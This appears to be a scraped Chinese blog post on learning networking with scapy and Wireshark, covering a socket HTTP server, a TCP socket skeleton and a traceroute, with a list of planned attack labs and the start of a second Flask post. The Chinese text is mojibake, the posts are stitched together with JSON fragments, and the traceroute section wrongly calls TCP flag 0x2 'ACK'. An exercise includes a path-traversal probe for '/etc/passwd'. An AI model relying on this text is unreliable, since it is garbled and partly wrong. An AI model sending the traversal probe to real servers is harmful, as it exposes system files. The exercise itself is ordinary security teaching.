ä¸€ä¸ªä¸»æœºæœ‰ä¸€ä¸ªåœ°å€å’Œå¤šä¸ªç«¯å£ã€‚åœ°å€å’Œç«¯å£çš„å…³ç³»ï¼Œå°±åƒæˆ¿å­å’Œçª—æˆ·çš„å…³ç³»ã€‚ socketç”±æ“ä½œç³»ç»Ÿæä¾›ã€‚æœ¬å®éªŒç”¨åˆ°çš„æ˜¯pythonå¯¹socketçš„å°è£…ï¼Œä½†ä¸ç®¡æ¢ä»€ä¹ˆè¯­è¨€æœ¬è´¨ä¸Šéƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨ã€‚ //å…¶ä¸­æ–‡ç¿»è¯‘â€œå¥—æ¥å­—â€éå¸¸å…·æœ‰è¯¯å¯¼æ€§ï¼Œå»ºè®®ç›´æ¥ç”¨è‹±æ–‡å•è¯ã€‚ æœ€åï¼Œå»ºè®®èŠ±5åˆ†é’Ÿé€šè¯»ã€Šå›¾è§£HTTPã€‹å‰6ç« ï¼ˆæˆ–è€…ã€ŠCNTDAã€‹2.1-2.2èŠ‚ï¼‰ï¼Œä½ å°±èƒ½è½»æ¾ç†è§£ä¸Šè¿°æœ¯è¯­ã€‚\nGuidelines Socketé€šä¿¡ è¦ä½¿ç”¨socketé€šä¿¡ï¼Œé€šä¿¡åŒæ–¹éƒ½éœ€è¦æŒæœ‰ä¸€ä¸ªsocketå¯¹è±¡ï¼Œå…¶ä¸»è¦æ–¹æ³•å’Œç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 SERVER CLIENT socket() socket() â”‚ â”‚ â–¼ â”‚ bind((host,port)) â”‚ â”‚ â”‚ â–¼ â”‚ listen(num) â”‚ â”‚ â”‚ â–¼ â–¼ accept() connect((host,port)) â”‚ â”‚ â”œâ”€â”€â–ºsend()â”€â”€â–ºrecv()â—„â”€â”€â”¤ â”‚ â”‚ â”œâ”€â”€â–ºrecv()â—„â”€â”€send()â—„â”€â”€â”¤ â”‚ â”‚ â–¼ â–¼ close() close() äºæ˜¯æˆ‘ä»¬å¯ä»¥å»ºç«‹èµ·æœåŠ¡å™¨ä»£ç çš„æ¡†æ¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import socket s = socket.socket() s.bind((\u0026#39;0.0.0.0\u0026#39;, 8000)) # ç»‘å®šåœ°å€å’Œç«¯å£ s.listen(5) # å¼€å§‹ç›‘å¬ï¼Œnumè¡¨ç¤ºæœ€å¤§è¿æ¥æ•°é‡ while True: c, addr = s.accept() # cæ˜¯å®¢æˆ·ç«¯socket print(\u0026#39;[+] accepted:\u0026#39;, addr) req = c.recv(1024) print(\u0026#39;[+] recieved:\u0026#39;, req.decode(\u0026#39;utf-8\u0026#39;)) # æ¥æ”¶ç±»å‹ä¸ºå­—èŠ‚å¯¹è±¡bytesï¼Œè¦æ‰“å°åˆ™åº”å½“ç¼–ç ä¸ºå­—ç¬¦ä¸² res = http_handler(req) # è§£æè¯·æ±‚ï¼Œè¿”å›å“åº” c.send(res) c.close() It\u0026rsquo;s worth noting thatï¼ŒæœåŠ¡ç«¯socketå¹¶æ²¡æœ‰å‘é€ä»»ä½•æ•°æ®ï¼accept()æ–¹æ³•å°†è¿”å›ä¸€ä¸ªå®¢æˆ·ç«¯socketå¯¹è±¡ï¼Œç”±è¿™ä¸ªsocketæ‰§è¡Œæ•°æ®çš„æ”¶å‘ã€‚è¿™æ ·åšçš„åŸå› æ˜¯ä¸ºäº†å®ç°å¤šè·¯å¤ç”¨ï¼Œå³è®©æœåŠ¡å™¨æ”¯æŒå¤šä¸ªè¿æ¥åŒæ—¶é€šä¿¡ã€‚ äºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹æ¯ä¸ªTCPè¿æ¥ï¼Œéƒ½æœ‰ä¸€å¯¹socketå­˜åœ¨äºé€šä¿¡çš„ä¸¤ç«¯ã€‚è€ŒæœåŠ¡ç«¯socketä»…ä»…åšäº†ç®¡ç†è¿æ¥çš„å·¥ä½œï¼Œä»–ä»¬æ”¾åœ¨ä¸€ä¸ªç±»é‡Œï¼Œæ˜¯å‡ºäºç®€åŒ–ä»£ç çš„è€ƒè™‘ã€‚ï¼ˆå½“ç„¶å®ç°å¤šè·¯å¤ç”¨çš„æ–¹å¼ä¸åªæœ‰ä¸€ç§ã€‚ ç°åœ¨ï¼Œä½ å¯ä»¥è‡ªå·±å°è¯•ç¼–å†™socketå®¢æˆ·ç«¯è·Ÿè¯¥æœåŠ¡å™¨è¿›è¡Œæ˜æ–‡çš„é€šä¿¡ã€‚ä¸è¿‡æˆ‘ä»¬çš„ç›®æ ‡æ˜¯HTTPæœåŠ¡å™¨ï¼Œå…ˆå¤ä¹ ä¸€ä¸‹HTTPåè®®æ ¼å¼ï¼ŒçŠ¶æ€ç ï¼Œé¦–éƒ¨ç­‰çŸ¥è¯†å§ã€‚\nHTTPè§£æ å¦‚æœç¼–ç¨‹èƒ½åŠ›å°šå¯ï¼Œä½ å¯ä»¥è‡ªå·±å†™HTTPç±»æ¥æŠŠæŠ¥æ–‡è§£ææˆå¯¹è±¡ã€‚è¿™é‡Œè¿˜æ˜¯ç”¨ç°æˆçš„ï¼Œscapyåº“æä¾›çš„HTTPRequestå’ŒHTTPResponseç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 from scapy.layers.http import * from scapy.all import * def http_handler(req_str): req = HTTPRequest() req.do_dissect(req_str) # è§£æè¯·æ±‚ print(\u0026#39;[+] req: \u0026#39;, req.summary()) # body = route(req.Path.decode()) # è·¯ç”±å‡½æ•° body = \u0026#34;\u0026lt;h1\u0026gt;Hello~~~\u0026lt;/h1\u0026gt;\u0026#34; res = HTTPResponse() res = HTTP() / res / body print(\u0026#39;[+] res: \u0026#39;, res.summary()) return raw(res) do_dissect()æ–¹æ³•å°†å­—ç¬¦ä¸²è§£æä¸ºå¯¹è±¡\nHTTP()/res/bodyï¼šscapyæ ¸å¿ƒè¯­æ³•/ï¼Œè¡¨ç¤ºåè®®æ ˆçš„å †å ï¼Œå¯ä»¥é“¾å¼è°ƒç”¨ã€‚\nè¿™é‡Œçš„ç±»å‹ä¸ºï¼šHTTP / HTTPResponse / Rawï¼Œä¹‹æ‰€ä»¥è¦è¿™æ ·ä¸‰å±‚è¡¨ç¤ºï¼Œæ˜¯å› ä¸ºHTTPResponse/HTTPRequestç±»ä»…ä»…æ˜¯ä¸€ä¸ªä¸­é—´å±‚ï¼Œå¦‚æœæ²¡æœ‰HTTPå±‚ï¼Œscapyä¼šæŠ¥warningã€‚\nraw()æ–¹æ³•è¿”å›å°åŒ…çš„å­—èŠ‚æ•°ç»„ï¼Œå¯ä»¥çœ‹åˆ°åœ¨socketä¹‹ä¸Šï¼Œæˆ‘ä»¬å…ˆæŠŠæŠ¥æ–‡è½¬åŒ–ä¸ºå¯¹è±¡ï¼Œè§£æä¹‹åå†è¿”å›æŠ¥æ–‡ã€‚\nè§‚å¯Ÿå°åŒ…çš„å¸¸ç”¨æ–¹æ³•è¿˜æœ‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 In [2]: a = Ether()/IP(dst=\u0026#34;www.wsnd.com\u0026#34;)/TCP() In [3]: a Out[3]: \u0026lt;Ether type=IPv4 |\u0026lt;IP frag=0 proto=tcp dst=Net(\u0026#34;www.wsnd.com/32\u0026#34;) |\u0026lt;TCP |\u0026gt;\u0026gt;\u0026gt; In [4]: a.summary() Out[4]: \u0026#39;Ether / IP / TCP 0.0.0.0:ftp_data \u0026gt; Net(\u0026#34;www.wsnd.com/32\u0026#34;):http S\u0026#39; In [5]: a.show() ###[ Ethernet ]### dst = ff:ff:ff:ff:ff:ff src = 00:00:00:00:00:00 type = IPv4 ###[ IP ]### version = 4 ... proto = tcp chksum = None src = 0.0.0.0 dst = Net(\u0026#34;www.wsnd.com/32\u0026#34;) \\options \\ ###[ TCP ]### sport = ftp_data dport = http ... In [6]: ls(a) dst : DestMACField = \u0026#39;ff:ff:ff:ff:ff:ff\u0026#39; (\u0026#39;None\u0026#39;) src : SourceMACField = \u0026#39;00:00:00:00:00:00\u0026#39; (\u0026#39;None\u0026#39;) type : XShortEnumField = 2048 (\u0026#39;36864\u0026#39;) ... In [7]: raw(a) Out[7]: b\u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00E\\x00\\x00(\\x00\\x01\\x00\\x00@\\x06\\xc9\\xa8\\x00\\x00\\x00\\x00H\\ti\\x1e\\x00\\x14\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00P\\x02 \\x00\\xdeW\\x00\\x00\u0026#39; In [8]: hexdump(a) 0000 FF FF FF FF FF FF 00 00 00 00 00 00 08 00 45 00 ..............E. 0010 00 28 00 01 00 00 40 06 C9 A8 00 00 00 00 48 09 .(....@.......H. 0020 69 1E 00 14 00 50 00 00 00 00 00 00 00 00 50 02 i....P........P. 0030 20 00 DE 57 00 00 ..W.. ç°åœ¨è¿è¡ŒæœåŠ¡å™¨ï¼Œç”¨æµè§ˆå™¨è®¿é—®localhost:8000ï¼Œä½ å¯ä»¥çœ‹åˆ°å¤§å¤§çš„â€œHelloâ€äº†ï¼\nTask ä¸‹é¢çš„ä»»åŠ¡äº¤ç»™ä½ ï¼Œç›®æ ‡æ˜¯å°½é‡æ¥è¿‘pythonè‡ªå¸¦httpæœåŠ¡å™¨çš„è¡¨ç°ã€‚\nä¸ºäº†å®ç°é™æ€æœåŠ¡å™¨ï¼Œä½ éœ€è¦æ ¹æ®è®¿é—®çš„è·¯å¾„è¿”å›å¯¹åº”çš„å†…å®¹ã€‚ä¸ºæ­¤ï¼Œè¯·å®Œå–„route()å‡½æ•°ï¼š\nè®¿é—®æ ¹è·¯å¾„/å°†è¿”å›index.html ä½¿ç”¨osæ¨¡å—è¯»å–æ–‡ä»¶ï¼Œæ³¨æ„æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼‰çš„å¤„ç† ç”¨HTTPå“åº”ç è¿›è¡Œé”™è¯¯å¤„ç†ï¼Œæ¯”å¦‚404 NOT FOUNDï¼Œ302 REDIRECT æœ€åï¼Œåœ¨æ ¹ç›®å½•(ä½ åœ¨å“ªé‡Œè¿è¡Œä½ çš„æœåŠ¡å™¨è„šæœ¬ï¼Œé‚£é‡Œå°±æ˜¯ä½ çš„æ ¹ç›®å½•)ä¸‹æ”¾å…¥ä»»æ„æ–‡ä»¶ï¼Œæµè§ˆå™¨éƒ½å¯ä»¥è®¿é—®å…¶å†…å®¹ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šè¿”å›404ã€‚\nExpand æŠ“åŒ…è§‚å¯Ÿè®¿é—®ä½ çš„ç½‘ç«™å’Œè®¿é—®æ­£å¸¸ç½‘ç«™æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ä½ ä¼šå‘ç°ï¼Œæœ¬å®éªŒå‡ ä¹æ²¡æœ‰è®²è§£HTTPé¦–éƒ¨çš„ç»†èŠ‚ï¼Œè¯·è‡ªè¡Œäº†è§£è¯¸å¦‚Content-Type:ï¼ŒContent-Length:ï¼ŒTransfer-Encoding:ç­‰é¦–éƒ¨ï¼Œçœ‹çœ‹ä¼ è¾“å›¾ç‰‡/å‹ç¼©æ–‡ä»¶æ—¶çš„æ ‡å‡†åšæ³•ï¼Œä»¥åŠåœ¨é‡åˆ°å¤§æ–‡ä»¶æ—¶å¦‚ä½•å®ç°åˆ†æ®µè¿è¾“ã€‚ï¼ˆå°½ç®¡æˆ‘ä»¬çš„å®ç°å¾ˆç®€é™‹ï¼Œæµè§ˆå™¨è¿˜æ˜¯èƒ½æ­£å¸¸å·¥ä½œï¼Œè¯´æ˜HTTPæ˜¯ç›¸å½“å¥å£®çš„åè®®ï¼‰ ä½ çš„æœåŠ¡å™¨æ˜¯å¦æœ‰å®‰å…¨é—®é¢˜ï¼Ÿä½ å¯ä»¥è®¿é—®æ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶å—ï¼Ÿå¦‚ï¼š /../../../../etc/passwdï¼ˆlinuxä¸‹ï¼‰ æœåŠ¡å™¨æ¦‚å¿µè¾¨æï¼šWebåˆå­¦è€…å®¹æ˜“å¯¹æœåŠ¡å™¨æ¦‚å¿µæ„Ÿåˆ°è¿·æƒ‘ã€‚è½¯ä»¶è¯­å¢ƒä¸‹ï¼ŒæœåŠ¡å™¨æŒ‡å¯¹å¤–æä¾›æœåŠ¡çš„ç¨‹åºï¼Œå¸¸ç”¨æœåŠ¡å™¨å¦‚apacheã€nginxï¼Œtomcatç­‰ï¼›ç¡¬ä»¶è¯­å¢ƒä¸‹åˆ™æŒ‡è¿è¡Œç€æœåŠ¡å™¨è½¯ä»¶çš„æœºå™¨ã€‚ æˆ‘ä»¬å®ç°çš„æ˜¯é™æ€ç½‘ç«™ï¼Œä½ å¯èƒ½ç–‘æƒ‘æ˜¯ä¸æ˜¯è¿˜æœ‰åŠ¨æ€ç½‘ç«™ã€‚å½“ç„¶æœ‰ï¼ŒåŒºåˆ†åŠ¨æ€å’Œé™æ€å¹¶ä¸æ˜¯ç½‘é¡µä¼šä¸ä¼šè‡ªå·±åŠ¨ï¼Œè€Œæ˜¯æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ˜¯å¦å¯ä»¥åŠ¨æ€çš„æ”¹å˜ï¼Œè€Œæˆ‘ä»¬çš„æœåŠ¡å™¨åªèƒ½è¢«åŠ¨çš„æ˜¾ç¤ºæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯æ— æ³•åšå‡ºä»»ä½•æ›´æ”¹ã€‚ç°ä»£webæ¡†æ¶è¯¸å¦‚Springbootï¼ŒDjangoä¹‹ç±»å½“ç„¶æ˜¯åŠ¨æ€ç½‘ç«™æ¡†æ¶ã€‚ å®é™…ä¸Šï¼Œä¼ ç»Ÿè®¡ç®—æœºç½‘ç»œå¹¶ä¸å…³å¿ƒåº”ç”¨å±‚ä»¥ä¸Šçš„ä¸œè¥¿ï¼Œè®©æˆ‘ä»¬å‘ä¸‹çœ‹ï¼Œæ¢ç©¶socketèƒŒåçš„åŸç†å§ã€‚\n0x20 ä¼ è¾“å±‚ï¼šSocket | â­ ç›®æ ‡ï¼šç”¨ scapy å®ç°TCPåè®®ï¼Œä»¥å°½å¯èƒ½æ›¿æ¢ä¸Šä¸€ä¸ªå®éªŒä½¿ç”¨çš„socketæ¨¡å— // ä½ å¯èƒ½çŒœåˆ°äº†ï¼Œä¸‹ä¸€ä¸ªå®éªŒæ˜¯ä¸æ˜¯è¦è‡ªå·±å®ç°IPåè®®å‘€ï¼Ÿæ­å–œä½ çŒœé”™äº†ã€‚ å‰ç½®ï¼š æœ¯è¯­ TCP/UDP TCPæŠ¥æ–‡æ ¼å¼ æœ‰é™çŠ¶æ€æœº å®Œæˆæœ¬å®éªŒä»…æ¶‰åŠã€ŠCNTDAã€‹3.4-3.5èŠ‚ï¼Œå¦‚æœç†è§£æœ‰å›°éš¾ï¼Œå»ºè®®å…ˆå®ŒæˆWireshark å®éªŒï¼šTCPè§‚å¯Ÿ åœ¨ä¸Šä¸€ä¸ªå®éªŒä¸­ï¼Œæˆ‘ä»¬äº†è§£åˆ°socketæ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚ Linux ä¸­ï¼Œåˆ›å»ºsocketå¯¹è±¡è¿”å›çš„sock_fdæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå³å»ºç«‹è¿æ¥åå¯ä»¥ç›´æ¥åƒæ–‡ä»¶ä¸€æ ·è¯»å†™ï¼Œç»‘å®šç«¯å£åæ“ä½œç³»ç»Ÿä¼šä¿æŠ¤è¯¥ç«¯å£ä¸è¢«å…¶ä»–è¿›ç¨‹å ç”¨ã€‚è€Œæœ¬å®éªŒå…³æ³¨è¿è¾“å±‚åŸç†ï¼Œæ‰€ä»¥ç»•è¿‡äº†æ“ä½œç³»ç»Ÿï¼Œä½¿ç”¨æ›´åº•å±‚çš„æ¥å£å®ç°TCPã€‚å½“ç„¶ï¼Œæ˜¯æœ€ç®€é™‹çš„ä¸€ç§å®ç°ã€‚ Guidelines Socketå®ç°åŸç† é‚£ä¹ˆï¼Œsocketé‡Œé¢åˆ°åº•æœ‰ä»€ä¹ˆï¼Ÿé¦–å…ˆï¼Œè¦ä¿å­˜åœ°å€ç«¯å£ç­‰ä¿¡æ¯ï¼›å…¶æ¬¡ï¼Œè¦æœ‰æ”¶å‘çš„ä¸¤ä¸ªç¼“å†²åŒºï¼Œè¿™é‡Œå¯ä»¥ç”¨é˜Ÿåˆ—ï¼›ç„¶åï¼Œä¸ºäº†å®ç°å¯é è¿è¾“ï¼Œéœ€è¦ç”¨åˆ°è®¡æ—¶å™¨æ¥è§¦å‘é‡ä¼ ï¼Œéœ€è¦å˜é‡æ ‡è®°æ»‘åŠ¨çª—å£ï¼›æˆ‘ä»¬è¿˜ç”¨è‡ªåŠ¨æœºæ€æƒ³æ¥ç®¡ç†è¿æ¥çŠ¶æ€ã€‚Socketåº•å±‚æ¨¡å‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 â”Œâ”€â”€â”€â”€â”€Socketâ”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â” â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â” â”‚ â”œâ”€â”€â”¼â”€â–º SendQ â”œâ”€â”€â”¼â”€â–ºâ”‚ â”‚ â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”‚ â”‚ App â”‚ â”‚ Buffers â”‚ â”‚ IP â”‚ â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”‚ â”‚ â”‚ â”‚â—„â”€â”¼â”€â”€â”¤ RecvQ â—„â”€â”¼â”€â”€â”¤ â”‚ â””â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â””â”€â”€â”€â”€â”˜ â”œâ”€â”€â”€â”€Variablesâ”€â”€â”€â”€â”¤ â”‚ Status â”‚ â”‚ Timer â”‚ â”‚ SendBase â”‚ â”‚ NextSeq â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ è¿™é‡Œå°±éœ€è¦é¢å‘å¯¹è±¡ä¸Šåœºäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 class Socket: def __init__(): self.SendQ = Queue() self.RecvQ = Queue() self.Status = Status.CLOSED self.Timer = Timer() self.SendBase = 0 self.NextSeq = 0 # SERVER def bind(addr): self.addr = addr pass def listen(num): pass def accept(): #return c, addr pass # CLIENT def connect(addr): pass # BOTH def recv(length): #return data pass def send(data): pass def close(): pass ä¸‹é¢é€ä¸ªå®ç°socketæ¥å£ã€‚\nã€to be continuedã€‘\nå®šåˆ¶TCPæŠ¥æ–‡ ã€to be continuedã€‘\nè¿æ¥ç®¡ç† äº†è§£äº†ä¸‰æ¬¡æ¡æ‰‹ï¼Œå°±å¯ä»¥å®ç°connectå‡½æ•°äº†\nã€to be continuedã€‘\nTask å¤šè·¯å¤ç”¨ ç›®å‰çš„å®ç°åªèƒ½æ”¯æŒä¸€ä¸ªTCPè¿æ¥ï¼Œè¯·å®ç°listen(num)å‡½æ•°ï¼Œè°ƒç”¨æ—¶åˆ›å»º num å¯¹è¯»å†™ç¼“å†²åŒºï¼Œå“åº”çš„ä¸º\nå®Œå–„TCPåŠŸèƒ½ï¼š RTT å¯é è¿è¾“ æµé‡æ§åˆ¶ é˜»å¡æ§åˆ¶ æ‹“å±•UDPåˆ°ä½ çš„socket Expand ã€to be continuedã€‘\n0x30 ç½‘ç»œå±‚: è·¯ç”±è¿½è¸ª | â­ Intro æœ¯è¯­ï¼š\nIPå±‚ï¼šIPåè®®ï¼ŒICMPåè®®ï¼Œè·¯ç”±åè®® è·¯ç”±è¿½è¸ªï¼šè¯·æ±‚æŸåœ°å€ç»è¿‡äº†é‚£äº›è·¯ç”±å™¨ï¼Ÿ Guidelines scapyå®ç°äº†è·¯ç”±è¿½è¸ªå‡½æ•°ï¼Œä½ å¯ä»¥é’»ç ”ä¸€ä¸‹æºç ï¼ˆå¾ˆçŸ­ï¼‰ï¼Œä¸‹é¢å†™ä¸€ä¸ªè‡ªå·±çš„tracerouteã€‚\nTask ä¸‹é¢ç”¨Ipythonæ¼”ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 In [1]: from scapy.all import * In [2]: target=\u0026#34;www.amazon.com\u0026#34; In [3]: ans, unans = sr(IP(dst=target,ttl=(1,30))/TCP(flags=0x2)) Begin emission: Finished sending 30 packets. .*****..**********..........................................................................^C Received 92 packets, got 15 answers, remaining 15 packets In [4]: for snd, rcv in ans: ...: print(snd.ttl, rcv.src, isinstance(rcv.payload, TCP)) ...: 1 11.206.119.46 False 2 11.110.80.173 False 3 10.102.15.74 False 4 11.73.2.241 False 5 124.160.189.101 False 6 219.158.97.2 False 7 219.158.34.190 False 8 69.192.14.38 True 9 219.158.24.134 False 10 219.158.10.30 False 11 69.192.14.38 True 12 69.192.14.38 True 13 69.192.14.38 True 14 69.192.14.38 True ä¸‹é¢è®²è§£æ ¸å¿ƒä»£ç ï¼š\nans,unans=sr(IP(dst=target,ttl=(1,30),id=RandShort())/TCP(flags=0x2))\nsr()ï¼šsend and receiveï¼Œè¿”å›çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å¾—åˆ°åº”ç­”çš„æ•°æ®åŒ…åˆ—è¡¨å’Œæœªåº”ç­”çš„åŒ…åˆ—è¡¨ã€‚ ttl=(4,30)ï¼šttlå‚æ•°åœ¨IPå±‚è¡¨ç¤ºICMPåŒ…çš„è½¬å‘æ¬¡æ•°ï¼ˆè·³æ•°ï¼‰ã€‚æ­¤å¤–ï¼Œä¼ å…¥tupleè¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œsrå‡½æ•°å°†ä¼šä¸ºè¿™ä¸ªèŒƒå›´å†…çš„æ¯ä¸ªå€¼ç”Ÿæˆä¸€ä¸ªå‘åŒ…ã€‚ï¼ˆå¦‚æœæœ‰å¤šä¸ªtupleå‚æ•°ï¼Œåˆ™ä¼šæŒ‰ç¬›å¡å°”ç§¯è§„åˆ™ç”Ÿæˆå‘åŒ…åˆ—è¡¨ï¼‰ TCP(flags=0x2)ï¼šåœ¨TCPå¤´éƒ¨è®¾å®šflagå­—æ®µçš„å€¼ï¼Œ0x2å¯¹åº”ACKï¼Œå³ç¡®è®¤æ”¶åˆ°åŒ…ã€‚ ç»¼åˆèµ·æ¥ï¼Œè¿™æ¡ä»£ç å°†å‘é€30ä¸ªåŒ…ï¼Œå…¶ttlä»1åˆ°30ã€‚å¹¶ç­›é€‰è¿”å›ACKçš„åŒ…ã€‚ è¿™æ ·æ ¹æ®IPå±‚è·¯ç”±ç®—æ³•ï¼Œåˆ°è¾¾ttlçš„åŒ…æ— è®ºæ˜¯å¦æ‰¾åˆ°ç›®æ ‡éƒ½ä¼šè¿”å›ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡ï¼ŒTCPå±‚è¿”å›ACKã€‚éå†ttlå½¢æˆçš„åˆ—è¡¨å³æ˜¯ç»è¿‡çš„æ‰€æœ‰è·¯ç”±ã€‚ Expand 0x301 ç½‘ç»œå±‚: æ¬ºéª—ping | â­ | TODO Intro æ¥æºï¼šhttps://seedsecuritylabs.org/Labs_20.04/Files/ICMP_Redirect/ICMP_Redirect.pdf æœ¯è¯­ï¼š Guidelines Task Expand 0x41 é“¾è·¯å±‚: ARPç¼“å­˜æŠ•æ¯’ | â­â­ | TODO https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf\n0x21 ä¼ è¾“å±‚: TCPæ”»å‡» | â­â­ | TODO https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf\nTCPåè®® SYNæ³›æ´ª TCP reset TCP session hijackingåå¼¹shell ï¼ˆé‡ç‚¹ï¼‰\n0x31 ç½‘ç»œå±‚: NATï¼ŒDHCPå’Œè™šæ‹Ÿæœº | â­â­ | TODO ç›¸ä¿¡æŠ˜è…¾è¿‡è™šæ‹Ÿæœºçš„åŒå­¦éƒ½ç»•ä¸è¿‡è¿™ä¸ªé—®é¢˜ï¼šæˆ‘çš„è™šæ‹Ÿæœºæ€ä¹ˆè¿ä¸ä¸Šç½‘ï¼Ÿæœ¬å®éªŒåŸºäºwmwareè™šæ‹Ÿæœºå¹³å°ï¼Œè®²è§£å‡ ç§è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼åŠå…¶åŸç†ã€‚\n0x13 åº”ç”¨å±‚: DNSæœ¬åœ°æ”»å‡» | â­â­â­ | TODO https://seedsecuritylabs.org/Labs_20.04/Files/DNS_Local/DNS_Local.pdf\n0x14 åº”ç”¨å±‚: SSLåè®®å’ŒHTTPS | â­â­â­â­ | TODO 0x15 åº”ç”¨å±‚: å¤šçº¿ç¨‹Webä»£ç†æœåŠ¡å™¨ | â­â­â­â­â­ | TODO 0x151 åº”ç”¨å±‚: VPN | â­â­â­â­â­ | TODO æ¢ç©¶VPNåŸç†\n0x152 åº”ç”¨å±‚: V2Rayåè®®å­¦ä¹  | ï¼Ÿï¼Ÿï¼Ÿ | TODO æœ‰ç”Ÿä¹‹å¹´ç ”ç©¶ä¸€ä¸‹Vmessç­‰åè®®\n","date":"2021-10-22T23:55:54Z","permalink":"https://lonelyuan.github.io/p/%E4%BB%8Escapy%E5%92%8Cwireshark%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"ä»scapyå’Œwiresharkå­¦è®¡ç®—æœºç½‘ç»œ"},{"content":" ä¸Šå›ä¹¦è¯´åˆ°ï¼Œç½‘ç«™åˆå…·é›å½¢ï¼Œä½†ç»é«˜äººæŒ‡ç‚¹ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šä¸è¶³ã€‚ æœ¬æ–‡å°†å¤§èƒ†æ‰©å……ç½‘ç«™ç»“æ„ï¼Œç›®æ ‡æ˜¯å°†ç½‘ç«™æ‹“å±•æˆä¸€ä¸ª CMS ã€‚ æ‰€ä»¥ï¼Œä¸è¦åœä¸‹æ¥å•Šï¼ğŸ‘†ï¼ˆæŒ‡å¼€å‘\n0x00 è“å›¾ä¸é‡æ„ ä¸ä¹‹å‰ç›¸æ¯”ï¼Œç½‘ç«™å°†å¢åŠ ä»¥ä¸‹åŠŸèƒ½ï¼š\nå›¾åº“ï¼šæ–‡ä»¶ä¸Šä¼ æ¨¡å— è¯„è®ºï¼šæ¥¼ä¸­æ¥¼åŠŸèƒ½ åå°ï¼šæƒé™æ¨¡å—ï¼Œåå°æ¨¡å— ä¼˜åŒ–ï¼šæ›´å¥å£®çš„æ•°æ®åº“æ¥å£ï¼Œæ›´ç»†è‡´çš„æƒé™æ§åˆ¶ plusåŠŸèƒ½ï¼šç”¨ redis å®ç°çƒ­æœ åœ¨å¼€å‘è¿™äº›åŠŸèƒ½ä¹‹å‰ï¼Œé¦–å…ˆé‡æ•´é¡¹ç›®ç»“æ„ã€‚å¦‚ï¼š\nå®Œå…¨è“å›¾åŒ–ã€‚å‚è€ƒ æ¨¡æ¿ä¹Ÿæ”¾å…¥ç‹¬ç«‹å­ç›®å½•é‡Œï¼Œè“å›¾æ³¨å†Œæ—¶ä½¿ç”¨template_folderå‚æ•°ï¼Œä¸è¿‡è¿™æ ·å®¹æ˜“äº§ç”Ÿbugï¼Œflask å®˜æ–¹æ¨èä½¿ç”¨ç¡¬ç¼–ç ï¼Œæ±—ã€‚ æ¸…ç†ä¾èµ–ï¼Œä¸ä½¿ç”¨ç»´æŠ¤çŠ¶æ€å·®çš„åº“ã€‚ å¼€å‘æ–°åŠŸèƒ½çš„æ—¶å€™ï¼Œå»å“ªé‡Œæ‰¾æœ€ä½³å®è·µï¼Œæ‰¾å¥½ç”¨çš„åº“å‘¢ï¼Ÿæœ‰ä¸€ä¸ª Github æœç´¢å°æŠ€å·§ï¼Œåä¸º \u0026ldquo;awesome-xxx\u0026rdquo; çš„ä»“åº“é€šå¸¸æ˜¯æŸæŠ€æœ¯çš„ä¼˜è´¨èµ„æºåˆ—è¡¨ã€‚å¦‚ï¼šhttps://github.com/humiaozuzu/awesome-flask 0x01 æ–‡ä»¶ç³»ç»Ÿ æœ¬éƒ¨åˆ†å‚è€ƒäº†æè¾‰å¤§ä½¬çš„ç³»åˆ—æ–‡ç« ï¼Œ https://zhuanlan.zhihu.com/p/23731819?refer=flask\nå¤´åƒï¼Œç…§ç‰‡â€¦â€¦æ–‡ä»¶ä¸Šä¼ 